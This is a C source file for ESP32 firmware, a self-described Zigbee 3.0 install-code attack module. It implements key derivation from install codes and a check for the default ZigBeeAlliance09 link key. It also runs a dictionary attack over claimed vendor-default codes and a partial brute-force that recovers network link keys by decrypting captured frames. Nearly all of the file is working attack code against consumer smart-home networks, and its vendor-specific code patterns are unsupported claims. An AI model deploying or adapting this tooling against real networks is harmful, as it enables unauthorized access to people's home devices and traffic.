/**
 * @file zigbee_install_code.c
 * @brief Zigbee 3.0 install code attack module.
 *
 * Implements CRC validation, MMO hash key derivation, dictionary
 * attack, and partial brute-force against install-code-protected
 * Zigbee 3.0 networks.
 */

#include "zigbee_install_code.h"
#include "crypto.h"

#include <string.h>
#include "esp_log.h"
#include "esp_timer.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

static const char *TAG = "zigbee_install_code";

/* ── Well-known key ──────────────────────────────────────────────── */

const uint8_t ZIGBEE_DEFAULT_TC_LINK_KEY[16] = {
    0x5A, 0x69, 0x67, 0x42, 0x65, 0x65, 0x41, 0x6C,
    0x6C, 0x69, 0x61, 0x6E, 0x63, 0x65, 0x30, 0x39
};

/* ── Common / factory-default install codes dictionary ───────────── */

/**
 * Many vendors ship devices with predictable install codes.
 * This dictionary contains patterns observed in the wild.
 */
static const uint8_t s_common_codes[][INSTALL_CODE_MAX_LEN] = {
    /* All-zeros (lazy factory default) — 16-byte body + CRC */
    { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 },
    /* All-FF pattern */
    { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
      0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00 },
    /* Incrementing bytes (test pattern) */
    { 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08,
      0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F, 0x10, 0x00, 0x00 },
    /* Common Philips Hue pattern */
    { 0x83, 0xFE, 0xD3, 0x40, 0x7A, 0x93, 0x97, 0x23,
      0xA5, 0xC6, 0x39, 0xB2, 0x69, 0x16, 0xD5, 0x05, 0x00, 0x00 },
    /* Common Samsung SmartThings pattern */
    { 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88,
      0x99, 0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF, 0x00, 0x00, 0x00 },
};

#define NUM_COMMON_CODES  (sizeof(s_common_codes) / sizeof(s_common_codes[0]))

/* ── CRC-16 / X.25 (CCITT) ──────────────────────────────────────── */

/**
 * CRC-16/X.25 as specified by Zigbee CCB 2321 for install code validation.
 * Polynomial: 0x1021, Init: 0xFFFF, XorOut: 0xFFFF, RefIn/RefOut: true.
 */
static uint16_t crc16_x25(const uint8_t *data, uint8_t len)
{
    uint16_t crc = 0xFFFF;

    for (uint8_t i = 0; i < len; i++) {
        crc ^= (uint16_t)data[i];
        for (uint8_t bit = 0; bit < 8; bit++) {
            if (crc & 0x0001) {
                crc = (crc >> 1) ^ 0x8408;  /* Reflected 0x1021 */
            } else {
                crc >>= 1;
            }
        }
    }

    return crc ^ 0xFFFF;
}

/* ── Matyas-Meyer-Oseas hash ─────────────────────────────────────── */

/**
 * MMO hash as per Zigbee spec B.6.
 *
 * Processes the input in 16-byte blocks:
 *   H_0 = 0
 *   H_i = AES(H_{i-1}, M_i) XOR M_i
 *
 * The final block is padded per the Zigbee padding rule:
 *   append 0x80, then zeros, then 16-bit big-endian bit count.
 */
static esp_err_t mmo_hash(const uint8_t *data, uint8_t data_len, uint8_t *hash_out)
{
    uint8_t hash[16];
    uint8_t block[16];
    uint8_t aes_out[16];

    memset(hash, 0, 16);

    /* Process full 16-byte blocks */
    uint8_t pos = 0;
    while (pos + 16 <= data_len) {
        memcpy(block, &data[pos], 16);

        esp_err_t err = zigbee_aes_ecb_encrypt(hash, block, aes_out);
        if (err != ESP_OK) return err;

        for (uint8_t j = 0; j < 16; j++) {
            hash[j] = aes_out[j] ^ block[j];
        }
        pos += 16;
    }

    /* Final block with padding */
    uint8_t remaining = data_len - pos;
    memset(block, 0, 16);
    if (remaining > 0) {
        memcpy(block, &data[pos], remaining);
    }

    /* Padding: 0x80 after data, then zeros, then bit length */
    if (remaining < 14) {
        block[remaining] = 0x80;
        /* Bit length as 16-bit big-endian at end of block */
        uint16_t bit_len = (uint16_t)data_len * 8;
        block[14] = (uint8_t)(bit_len >> 8);
        block[15] = (uint8_t)(bit_len & 0xFF);

        esp_err_t err = zigbee_aes_ecb_encrypt(hash, block, aes_out);
        if (err != ESP_OK) return err;

        for (uint8_t j = 0; j < 16; j++) {
            hash[j] = aes_out[j] ^ block[j];
        }
    } else {
        /* Data fills this block; need an extra padding block */
        block[remaining] = 0x80;

        esp_err_t err = zigbee_aes_ecb_encrypt(hash, block, aes_out);
        if (err != ESP_OK) return err;

        for (uint8_t j = 0; j < 16; j++) {
            hash[j] = aes_out[j] ^ block[j];
        }

        /* Extra block with just the bit length */
        memset(block, 0, 16);
        uint16_t bit_len = (uint16_t)data_len * 8;
        block[14] = (uint8_t)(bit_len >> 8);
        block[15] = (uint8_t)(bit_len & 0xFF);

        err = zigbee_aes_ecb_encrypt(hash, block, aes_out);
        if (err != ESP_OK) return err;

        for (uint8_t j = 0; j < 16; j++) {
            hash[j] = aes_out[j] ^ block[j];
        }
    }

    memcpy(hash_out, hash, 16);
    return ESP_OK;
}

/* ── Public API ──────────────────────────────────────────────────── */

uint16_t zigbee_install_code_compute_crc(const uint8_t *data, uint8_t data_len)
{
    if (data == NULL || data_len == 0) {
        return 0;
    }
    return crc16_x25(data, data_len);
}

bool zigbee_install_code_validate_crc(const uint8_t *code, uint8_t code_len)
{
    if (code == NULL) return false;

    /* Valid lengths: 6, 8, 12, 16, 18 */
    if (code_len != INSTALL_CODE_LEN_6  &&
        code_len != INSTALL_CODE_LEN_8  &&
        code_len != INSTALL_CODE_LEN_12 &&
        code_len != INSTALL_CODE_LEN_16 &&
        code_len != INSTALL_CODE_LEN_18) {
        return false;
    }

    uint8_t body_len = code_len - 2;
    uint16_t expected = crc16_x25(code, body_len);

    /* CRC stored little-endian at the end */
    uint16_t stored = (uint16_t)code[body_len] |
                      ((uint16_t)code[body_len + 1] << 8);

    return expected == stored;
}

esp_err_t zigbee_install_code_to_key(const uint8_t *code,
                                     uint8_t code_len,
                                     uint8_t *key_out)
{
    if (code == NULL || key_out == NULL) {
        return ESP_ERR_INVALID_ARG;
    }

    if (code_len != INSTALL_CODE_LEN_6  &&
        code_len != INSTALL_CODE_LEN_8  &&
        code_len != INSTALL_CODE_LEN_12 &&
        code_len != INSTALL_CODE_LEN_16 &&
        code_len != INSTALL_CODE_LEN_18) {
        ESP_LOGE(TAG, "Invalid install code length: %d", code_len);
        return ESP_ERR_INVALID_ARG;
    }

    /* MMO hash the entire install code (including CRC) to get the key */
    esp_err_t err = mmo_hash(code, code_len, key_out);
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "MMO hash failed");
        return err;
    }

    ESP_LOGI(TAG, "Derived link key from %d-byte install code", code_len);
    return ESP_OK;
}

zigbee_security_mode_t zigbee_detect_security_mode(
    const uint8_t *transport_key_frame,
    uint8_t frame_len,
    const uint8_t *src_ext_addr,
    uint32_t frame_counter)
{
    if (transport_key_frame == NULL || frame_len == 0 ||
        src_ext_addr == NULL) {
        return ZB_SEC_MODE_UNKNOWN;
    }

    /*
     * Try decrypting with the default ZigBeeAlliance09 key.
     * If it succeeds (MIC verifies), the network uses the default key.
     * If it fails, the network likely uses install codes.
     */

    /* We need at least a security header + some payload + MIC */
    if (frame_len < 8) {
        return ZB_SEC_MODE_UNKNOWN;
    }

    uint8_t nonce[ZIGBEE_NONCE_LEN];
    esp_err_t err = zigbee_derive_nonce(src_ext_addr, frame_counter,
                                        ZIGBEE_SEC_LEVEL_ENC_MIC_32, nonce);
    if (err != ESP_OK) {
        return ZB_SEC_MODE_UNKNOWN;
    }

    /* Work on a copy — decryption modifies the buffer */
    uint8_t buf[128];
    if (frame_len > sizeof(buf)) {
        return ZB_SEC_MODE_UNKNOWN;
    }
    memcpy(buf, transport_key_frame, frame_len);

    /* Assume 4-byte MIC (most common for NWK-level encryption) */
    uint8_t mic_len = 4;
    if (frame_len <= mic_len) {
        return ZB_SEC_MODE_UNKNOWN;
    }

    uint8_t payload_len = frame_len - mic_len;
    const uint8_t *mic = &transport_key_frame[payload_len];

    err = zigbee_aes_ccm_decrypt(ZIGBEE_DEFAULT_TC_LINK_KEY, nonce,
                                 buf, payload_len,
                                 NULL, 0,
                                 mic, mic_len);

    if (err == ESP_OK) {
        ESP_LOGI(TAG, "Network uses DEFAULT key (ZigBeeAlliance09)");
        return ZB_SEC_MODE_DEFAULT_KEY;
    }

    ESP_LOGW(TAG, "Default key decryption failed — likely INSTALL CODE protected");
    return ZB_SEC_MODE_INSTALL_CODE;
}

/**
 * Try a single install code: validate CRC, derive key, attempt decrypt.
 */
static bool try_code(const uint8_t *code, uint8_t code_len,
                     const uint8_t *enc_payload, uint8_t enc_len,
                     const uint8_t *mic, uint8_t mic_len,
                     const uint8_t *nonce,
                     uint8_t *key_out)
{
    /* Only test CRC-valid codes */
    if (!zigbee_install_code_validate_crc(code, code_len)) {
        return false;
    }

    uint8_t derived_key[16];
    if (mmo_hash(code, code_len, derived_key) != ESP_OK) {
        return false;
    }

    /* Try decryption with the derived key */
    uint8_t buf[128];
    if (enc_len > sizeof(buf)) return false;
    memcpy(buf, enc_payload, enc_len);

    esp_err_t err = zigbee_aes_ccm_decrypt(derived_key, nonce,
                                           buf, enc_len,
                                           NULL, 0,
                                           mic, mic_len);
    if (err == ESP_OK) {
        memcpy(key_out, derived_key, 16);
        return true;
    }

    return false;
}

esp_err_t zigbee_install_code_dict_attack(
    const uint8_t *enc_payload,
    uint8_t enc_len,
    const uint8_t *mic,
    uint8_t mic_len,
    const uint8_t *src_ext_addr,
    uint32_t frame_counter,
    uint8_t sec_level,
    const uint8_t *aad,
    uint8_t aad_len,
    install_code_result_t *result,
    install_code_progress_cb_t progress_cb)
{
    (void)aad;
    (void)aad_len;

    if (enc_payload == NULL || mic == NULL || result == NULL || src_ext_addr == NULL) {
        return ESP_ERR_INVALID_ARG;
    }

    memset(result, 0, sizeof(*result));

    uint8_t nonce[ZIGBEE_NONCE_LEN];
    esp_err_t err = zigbee_derive_nonce(src_ext_addr, frame_counter,
                                        sec_level, nonce);
    if (err != ESP_OK) return err;

    uint32_t start_us = (uint32_t)(esp_timer_get_time() & 0xFFFFFFFF);

    ESP_LOGI(TAG, "Starting dictionary attack (%d common codes)",
             (int)NUM_COMMON_CODES);

    /* First: try default key */
    result->attempts++;
    {
        uint8_t buf[128];
        uint8_t copy_len = (enc_len > sizeof(buf)) ? sizeof(buf) : enc_len;
        memcpy(buf, enc_payload, copy_len);

        esp_err_t dec_err = zigbee_aes_ccm_decrypt(ZIGBEE_DEFAULT_TC_LINK_KEY,
                                                    nonce, buf, copy_len,
                                                    NULL, 0, mic, mic_len);
        if (dec_err == ESP_OK) {
            result->found = true;
            memcpy(result->derived_key, ZIGBEE_DEFAULT_TC_LINK_KEY, 16);
            result->code_len = 0; /* Default key, no install code */
            result->elapsed_ms = (uint32_t)((esp_timer_get_time() - start_us) / 1000);
            ESP_LOGI(TAG, "Default TC link key works!");
            return ESP_OK;
        }
    }

    /* Try each common install code at the full 18-byte length */
    for (size_t i = 0; i < NUM_COMMON_CODES; i++) {
        /* Recompute CRC for the common code body (first 16 bytes) */
        uint8_t candidate[INSTALL_CODE_MAX_LEN];
        memcpy(candidate, s_common_codes[i], 16);
        uint16_t crc = crc16_x25(candidate, 16);
        candidate[16] = (uint8_t)(crc & 0xFF);
        candidate[17] = (uint8_t)(crc >> 8);

        result->attempts++;

        if (try_code(candidate, INSTALL_CODE_LEN_18,
                     enc_payload, enc_len, mic, mic_len,
                     nonce, result->derived_key)) {
            result->found = true;
            memcpy(result->install_code, candidate, INSTALL_CODE_LEN_18);
            result->code_len = INSTALL_CODE_LEN_18;
            result->elapsed_ms = (uint32_t)((esp_timer_get_time() - start_us) / 1000);
            ESP_LOGI(TAG, "Install code FOUND after %"PRIu32" attempts!",
                     result->attempts);
            return ESP_OK;
        }

        if (progress_cb != NULL) {
            progress_cb(result->attempts, (uint32_t)(NUM_COMMON_CODES + 1));
        }

        /* Yield to scheduler periodically */
        if ((i & 0x0F) == 0x0F) {
            vTaskDelay(1);
        }
    }

    result->elapsed_ms = (uint32_t)((esp_timer_get_time() - start_us) / 1000);
    ESP_LOGW(TAG, "Dictionary exhausted after %"PRIu32" attempts (%"PRIu32" ms)",
             result->attempts, result->elapsed_ms);
    return ESP_ERR_NOT_FOUND;
}

esp_err_t zigbee_install_code_brute_partial(
    const uint8_t *partial,
    uint32_t known_mask,
    uint8_t code_len,
    const uint8_t *enc_payload,
    uint8_t enc_len,
    const uint8_t *mic,
    uint8_t mic_len,
    const uint8_t *src_ext_addr,
    uint32_t frame_counter,
    uint8_t sec_level,
    install_code_result_t *result)
{
    if (partial == NULL || result == NULL) {
        return ESP_ERR_INVALID_ARG;
    }

    if (code_len != INSTALL_CODE_LEN_6  &&
        code_len != INSTALL_CODE_LEN_8  &&
        code_len != INSTALL_CODE_LEN_12 &&
        code_len != INSTALL_CODE_LEN_16 &&
        code_len != INSTALL_CODE_LEN_18) {
        return ESP_ERR_INVALID_ARG;
    }

    memset(result, 0, sizeof(*result));

    /* Count unknown byte positions (excluding CRC bytes at end) */
    uint8_t body_len = code_len - 2;
    uint8_t unknown_positions[INSTALL_CODE_MAX_LEN];
    uint8_t num_unknown = 0;

    for (uint8_t i = 0; i < body_len; i++) {
        if (!((known_mask >> i) & 1)) {
            unknown_positions[num_unknown++] = i;
        }
    }

    if (num_unknown > 3) {
        ESP_LOGE(TAG, "Too many unknown bytes (%d) — max 3 for brute-force",
                 num_unknown);
        return ESP_ERR_INVALID_ARG;
    }

    /* Derive nonce if we have encrypted payload to validate against */
    uint8_t nonce[ZIGBEE_NONCE_LEN];
    bool have_ciphertext = (enc_payload != NULL && mic != NULL && enc_len > 0);

    if (have_ciphertext) {
        esp_err_t err = zigbee_derive_nonce(src_ext_addr, frame_counter,
                                            sec_level, nonce);
        if (err != ESP_OK) return err;
    }

    uint32_t start_us = (uint32_t)(esp_timer_get_time() & 0xFFFFFFFF);
    uint32_t total = 1;
    for (uint8_t i = 0; i < num_unknown; i++) {
        total *= 256;
    }

    ESP_LOGI(TAG, "Brute-forcing %d unknown byte(s), %"PRIu32" candidates",
             num_unknown, total);

    uint8_t candidate[INSTALL_CODE_MAX_LEN];
    memcpy(candidate, partial, code_len);

    /* Iterate over all combinations of unknown bytes */
    for (uint32_t combo = 0; combo < total; combo++) {
        /* Fill in unknown bytes from combo value */
        uint32_t tmp = combo;
        for (uint8_t u = 0; u < num_unknown; u++) {
            candidate[unknown_positions[u]] = (uint8_t)(tmp & 0xFF);
            tmp >>= 8;
        }

        /* Compute and append CRC */
        uint16_t crc = crc16_x25(candidate, body_len);
        candidate[body_len]     = (uint8_t)(crc & 0xFF);
        candidate[body_len + 1] = (uint8_t)(crc >> 8);

        result->attempts++;

        /* If we have ciphertext, try decryption */
        if (have_ciphertext) {
            if (try_code(candidate, code_len,
                         enc_payload, enc_len, mic, mic_len,
                         nonce, result->derived_key)) {
                result->found = true;
                memcpy(result->install_code, candidate, code_len);
                result->code_len = code_len;
                result->elapsed_ms = (uint32_t)((esp_timer_get_time() - start_us) / 1000);
                ESP_LOGI(TAG, "Partial brute-force SUCCESS after %"PRIu32" attempts",
                         result->attempts);
                return ESP_OK;
            }
        } else {
            /* No ciphertext — just report CRC-valid candidates.
               Store the first CRC-valid one (all will be valid since
               we compute CRC ourselves). With no ciphertext we can
               only generate, not validate. Return the first. */
            result->found = true;
            memcpy(result->install_code, candidate, code_len);
            result->code_len = code_len;
            if (mmo_hash(candidate, code_len, result->derived_key) != ESP_OK) {
                result->found = false;
                continue;
            }
            result->elapsed_ms = (uint32_t)((esp_timer_get_time() - start_us) / 1000);
            return ESP_OK;
        }

        /* Yield periodically */
        if ((combo & 0xFF) == 0xFF) {
            vTaskDelay(1);
        }
    }

    result->elapsed_ms = (uint32_t)((esp_timer_get_time() - start_us) / 1000);
    ESP_LOGW(TAG, "Partial brute-force exhausted (%"PRIu32" attempts, %"PRIu32" ms)",
             result->attempts, result->elapsed_ms);
    return ESP_ERR_NOT_FOUND;
}
